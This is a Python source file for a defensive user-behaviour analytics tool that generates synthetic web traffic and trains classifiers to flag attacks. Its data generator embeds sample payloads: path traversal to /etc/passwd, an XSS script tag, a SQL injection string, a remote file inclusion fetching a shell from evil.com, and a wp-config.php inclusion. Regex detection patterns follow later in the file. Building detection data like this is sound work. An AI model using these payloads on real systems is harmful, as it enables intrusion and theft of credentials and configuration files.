#!/usr/bin/env python3
"""
UEBA System v3.1 - Optimized, Clean, Fast & User-Friendly
Enhanced cybersecurity platform with streamlined operations
"""

import os
import sys

# Suppress TensorFlow warnings for cleaner output
os.environ['TF_CPP_MIN_LOG_LEVEL'] = '3'
os.environ['TF_ENABLE_ONEDNN_OPTS'] = '0'

import pandas as pd
import numpy as np
from datetime import datetime, timedelta
import argparse
import json
from pathlib import Path
import time
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

# Suppress warnings for cleaner output
warnings.filterwarnings('ignore')
logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger(__name__)

class OptimizedUEBASystem:
    def __init__(self):
        self.version = "3.1"
        self.start_time = time.time()
        self.results = {}
        
    def print_header(self):
        """Clean, professional header"""
        print("\n" + "="*70)
        print(f"🛡️  UEBA SYSTEM v{self.version} - OPTIMIZED SECURITY PLATFORM")
        print("="*70)
        print("🚀 Performance Optimized | 🧹 Clean Interface | ⚡ Fast Processing")
        print("="*70 + "\n")
    
    def print_status(self, message, status="INFO"):
        """Consistent status messaging"""
        icons = {"INFO": "ℹ️", "SUCCESS": "✅", "ERROR": "❌", "WARNING": "⚠️", "PROCESSING": "🔄"}
        icon = icons.get(status, "ℹ️")
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {icon} {message}")
    
    def quick_system_check(self):
        """Fast system health check"""
        self.print_status("Running system health check...", "PROCESSING")
        
        checks = {
            "Docker": self.check_docker(),
            "Elasticsearch": self.check_elasticsearch(),
            "Python Packages": self.check_packages(),
            "Model Directory": self.check_models(),
            "Data Availability": self.check_data()
        }
        
        all_good = all(checks.values())
        
        print("\n📊 SYSTEM STATUS:")
        for service, status in checks.items():
            icon = "✅" if status else "❌"
            print(f"   {icon} {service}")
        
        overall = "HEALTHY" if all_good else "NEEDS ATTENTION"
        self.print_status(f"System Status: {overall}", "SUCCESS" if all_good else "WARNING")
        return all_good
    
    def check_docker(self):
        """Check Docker containers"""
        try:
            import subprocess
            result = subprocess.run(['docker', 'ps', '--format', 'table {{.Names}}'], 
                                 capture_output=True, text=True, timeout=5)
            return 'elasticsearch' in result.stdout and 'grafana' in result.stdout
        except:
            return False
    
    def check_elasticsearch(self):
        """Check Elasticsearch connection"""
        try:
            import requests
            response = requests.get('http://localhost:9200', timeout=3)
            return response.status_code == 200
        except:
            return False
    
    def check_packages(self):
        """Check required Python packages"""
        try:
            import tensorflow, sklearn, pandas, numpy
            return True
        except ImportError:
            return False
    
    def check_models(self):
        """Check if model directory exists"""
        return os.path.exists('ml_models') or os.path.exists('analytics-engine/ml_models')
    
    def check_data(self):
        """Check data availability using the fixed elasticsearch utility"""
        try:
            from elasticsearch_utility import ElasticsearchUtility
            es_util = ElasticsearchUtility()
            connected, _ = es_util.test_connection()
            if connected:
                count = es_util.get_data_count()
                return count > 0
            return False
        except:
            return False
    
    def generate_optimized_data(self, size=500, attack_rate=0.15):
        """Generate high-quality synthetic security data"""
        self.print_status(f"Generating {size} optimized security events...", "PROCESSING")
        
        np.random.seed(42)  # Reproducible results
        
        # Pre-define attack patterns for efficiency
        attack_patterns = [
            {"url": "/admin/../../../etc/passwd", "type": "directory_traversal"},
            {"url": "/search?q=<script>alert('xss')</script>", "type": "xss"},
            {"url": "/login.php?id=1' OR '1'='1", "type": "sql_injection"},
            {"url": "/upload.php?file=http://evil.com/shell.txt", "type": "rfi"},
            {"url": "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php", "type": "lfi"}
        ]
        
        normal_patterns = [
            "/home", "/about", "/contact", "/products", "/services",
            "/search?q=python", "/user/profile", "/api/data", "/dashboard",
            "/login", "/register", "/help", "/documentation"
        ]
        
        data = []
        attack_count = int(size * attack_rate)
        
        # Generate attacks
        for i in range(attack_count):
            pattern = np.random.choice(attack_patterns)
            data.append({
                'timestamp': datetime.now() - timedelta(minutes=np.random.randint(0, 1440)),
                'url': pattern['url'],
                'method': np.random.choice(['GET', 'POST'], p=[0.6, 0.4]),
                'status_code': np.random.choice([200, 403, 500], p=[0.3, 0.5, 0.2]),
                'response_size': np.random.randint(100, 2000),
                'user_agent': np.random.choice(['curl/7.0', 'sqlmap/1.0', 'nikto/2.0']),
                'ip_address': f"192.168.1.{np.random.randint(1, 255)}",
                'attack_type': pattern['type'],
                'is_attack': 1,
                'severity': np.random.choice(['high', 'medium'], p=[0.7, 0.3])
            })
        
        # Generate normal traffic
        for i in range(size - attack_count):
            data.append({
                'timestamp': datetime.now() - timedelta(minutes=np.random.randint(0, 1440)),
                'url': np.random.choice(normal_patterns),
                'method': np.random.choice(['GET', 'POST', 'PUT'], p=[0.8, 0.15, 0.05]),
                'status_code': np.random.choice([200, 404], p=[0.9, 0.1]),
                'response_size': np.random.randint(1000, 8000),
                'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'ip_address': f"10.0.0.{np.random.randint(1, 255)}",
                'attack_type': 'none',
                'is_attack': 0,
                'severity': 'low'
            })
        
        df = pd.DataFrame(data)
        self.print_status(f"Generated {len(df)} events ({attack_count} attacks, {len(df)-attack_count} normal)", "SUCCESS")
        return df
    
    def fast_feature_engineering(self, df):
        """Optimized feature engineering"""
        self.print_status("Engineering features (optimized)...", "PROCESSING")
        
        # Vectorized operations for speed
        df['url_length'] = df['url'].str.len()
        df['param_count'] = df['url'].str.count('&') + df['url'].str.contains('\\?').astype(int)
        
        # Batch pattern detection
        patterns = {
            'has_script': r'<script>|javascript:|alert\(',
            'has_sql': r"'|union|select|drop|insert|update|delete|--|;",
            'has_traversal': r'\.\./|\.\.\|\.\.%2f',
            'has_admin': r'/admin|/wp-admin|/administrator',
            'has_upload': r'/upload|/file|/media'
        }
        
        for feature, pattern in patterns.items():
            df[feature] = df['url'].str.contains(pattern, case=False, na=False).astype(int)
        
        # HTTP features
        df['is_post'] = (df['method'] == 'POST').astype(int)
        df['is_error'] = (df['status_code'] >= 400).astype(int)
        df['response_size_norm'] = (df['response_size'] - df['response_size'].min()) / (df['response_size'].max() - df['response_size'].min())
        
        # User agent features
        df['is_bot'] = df['user_agent'].str.contains('bot|crawler|spider|curl|sqlmap|nikto', case=False, na=False).astype(int)
        
        feature_cols = ['url_length', 'param_count', 'has_script', 'has_sql', 'has_traversal', 
                       'has_admin', 'has_upload', 'is_post', 'is_error', 'response_size_norm', 'is_bot']
        
        self.print_status(f"Created {len(feature_cols)} optimized features", "SUCCESS")
        return df, feature_cols
    
    def parallel_ml_training(self, X, y):
        """Train multiple ML models in parallel for speed"""
        self.print_status("Training ML models (parallel processing)...", "PROCESSING")
        
        from sklearn.ensemble import RandomForestClassifier, IsolationForest
        from sklearn.svm import OneClassSVM
        from sklearn.neighbors import LocalOutlierFactor
        from sklearn.model_selection import train_test_split
        from sklearn.metrics import accuracy_score, precision_score, recall_score
        
        X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42, stratify=y)
        
        # Define models with optimized parameters
        models = {
            'RandomForest': RandomForestClassifier(n_estimators=100, max_depth=10, random_state=42, n_jobs=-1),
            'IsolationForest': IsolationForest(contamination=0.15, random_state=42, n_jobs=-1),
        }
        
        results = {}
        
        def train_model(name, model):
            start_time = time.time()
            
            if name == 'IsolationForest':
                # Unsupervised model
                model.fit(X_train)
                y_pred = model.predict(X_test)
                y_pred = (y_pred == -1).astype(int)  # Convert to binary
            else:
                # Supervised model
                model.fit(X_train, y_train)
                y_pred = model.predict(X_test)
            
            # Calculate metrics
            accuracy = accuracy_score(y_test, y_pred)
            precision = precision_score(y_test, y_pred, zero_division=0)
            recall = recall_score(y_test, y_pred, zero_division=0)
            train_time = time.time() - start_time
            
            return name, {
                'model': model,
                'accuracy': accuracy,
                'precision': precision,
                'recall': recall,
                'train_time': train_time,
                'predictions': y_pred
            }
        
        # Parallel training
        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(train_model, name, model) for name, model in models.items()]
            
            for future in as_completed(futures):
                name, result = future.result()
                results[name] = result
                self.print_status(f"{name}: {result['accuracy']:.3f} accuracy ({result['train_time']:.2f}s)", "SUCCESS")
        
        return results
    
    def run_optimized_analysis(self, data_size=500, fast_mode=True):
        """Main optimized analysis pipeline"""
        start_time = time.time()
        
        # Generate data
        df = self.generate_optimized_data(data_size)
        
        # Feature engineering
        df, feature_cols = self.fast_feature_engineering(df)
        
        # Prepare ML data
        X = df[feature_cols].fillna(0)
        y = df['is_attack']
        
        # Train models
        if fast_mode:
            ml_results = self.parallel_ml_training(X, y)
        else:
            # Placeholder for full training
            ml_results = self.parallel_ml_training(X, y)
        
        # Calculate overall metrics
        total_time = time.time() - start_time
        
        # Summary
        print("\n" + "="*70)
        print("📊 OPTIMIZED ANALYSIS RESULTS")
        print("="*70)
        print(f"📈 Dataset: {len(df)} events ({y.sum()} attacks)")
        print(f"🔧 Features: {len(feature_cols)} engineered features")
        print(f"⚡ Processing Time: {total_time:.2f} seconds")
        print(f"🎯 Attack Detection Rate: {y.mean():.1%}")
        
        print("\n🤖 ML MODEL PERFORMANCE:")
        for name, result in ml_results.items():
            print(f"   🔹 {name}: {result['accuracy']:.1%} accuracy, {result['precision']:.1%} precision")
        
        # Find best model
        best_model = max(ml_results.items(), key=lambda x: x[1]['accuracy'])
        print(f"\n🏆 Best Model: {best_model[0]} ({best_model[1]['accuracy']:.1%} accuracy)")
        
        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_summary = {
            'timestamp': timestamp,
            'version': self.version,
            'dataset_size': len(df),
            'processing_time': total_time,
            'attack_rate': float(y.mean()),
            'best_model': best_model[0],
            'best_accuracy': float(best_model[1]['accuracy']),
            'feature_count': len(feature_cols)
        }
        
        os.makedirs('results', exist_ok=True)
        with open(f'results/ueba_optimized_{timestamp}.json', 'w') as f:
            json.dump(results_summary, f, indent=2)
        
        print(f"💾 Results saved to: results/ueba_optimized_{timestamp}.json")
        print("="*70)
        
        return results_summary
    
    def interactive_menu(self):
        """User-friendly interactive menu"""
        self.print_header()
        
        while True:
            print("\n🎯 SELECT OPERATION:")
            print("   1. 🔍 Quick System Check")
            print("   2. 🚀 Fast Analysis (500 events)")
            print("   3. 📊 Comprehensive Analysis (1000 events)")
            print("   4. ⚡ Speed Test (100 events)")
            print("   5. 🛠️ Custom Analysis")
            print("   6. 📈 View Recent Results")
            print("   7. ❌ Exit")
            
            try:
                choice = input("\n➤ Enter your choice (1-7): ").strip()
                
                if choice == '1':
                    self.quick_system_check()
                elif choice == '2':
                    self.run_optimized_analysis(500, fast_mode=True)
                elif choice == '3':
                    self.run_optimized_analysis(1000, fast_mode=False)
                elif choice == '4':
                    self.print_status("Running speed test...", "PROCESSING")
                    start = time.time()
                    self.run_optimized_analysis(100, fast_mode=True)
                    total = time.time() - start
                    self.print_status(f"Speed test completed in {total:.2f} seconds", "SUCCESS")
                elif choice == '5':
                    size = int(input("Enter dataset size (100-2000): "))
                    size = max(100, min(2000, size))  # Bounds checking
                    self.run_optimized_analysis(size, fast_mode=True)
                elif choice == '6':
                    self.show_recent_results()
                elif choice == '7':
                    self.print_status("Thank you for using UEBA System v3.1!", "SUCCESS")
                    break
                else:
                    self.print_status("Invalid choice. Please try again.", "WARNING")
                    
            except KeyboardInterrupt:
                self.print_status("\nOperation cancelled by user", "WARNING")
            except Exception as e:
                self.print_status(f"Error: {str(e)}", "ERROR")
    
    def show_recent_results(self):
        """Show recent analysis results"""
        results_dir = Path('results')
        if not results_dir.exists():
            self.print_status("No results directory found", "WARNING")
            return
        
        json_files = list(results_dir.glob('ueba_optimized_*.json'))
        if not json_files:
            self.print_status("No recent results found", "WARNING")
            return
        
        # Sort by modification time
        json_files.sort(key=lambda x: x.stat().st_mtime, reverse=True)
        
        print("\n📊 RECENT RESULTS:")
        for i, file in enumerate(json_files[:5]):  # Show last 5
            try:
                with open(file, 'r') as f:
                    data = json.load(f)
                
                print(f"\n   {i+1}. {data['timestamp']}")
                print(f"      📈 Dataset: {data['dataset_size']} events")
                print(f"      🎯 Best Model: {data['best_model']} ({data['best_accuracy']:.1%})")
                print(f"      ⚡ Processing: {data['processing_time']:.2f}s")
                
            except Exception as e:
                self.print_status(f"Error reading {file}: {e}", "ERROR")

def main():
    parser = argparse.ArgumentParser(description='UEBA System v3.1 - Optimized Security Platform')
    parser.add_argument('--mode', choices=['interactive', 'auto', 'check'], default='interactive',
                       help='Operation mode')
    parser.add_argument('--size', type=int, default=500, help='Dataset size for auto mode')
    parser.add_argument('--fast', action='store_true', help='Enable fast mode')
    
    args = parser.parse_args()
    
    system = OptimizedUEBASystem()
    
    if args.mode == 'interactive':
        system.interactive_menu()
    elif args.mode == 'auto':
        system.print_header()
        system.run_optimized_analysis(args.size, args.fast)
    elif args.mode == 'check':
        system.print_header()
        system.quick_system_check()

if __name__ == "__main__":
    main()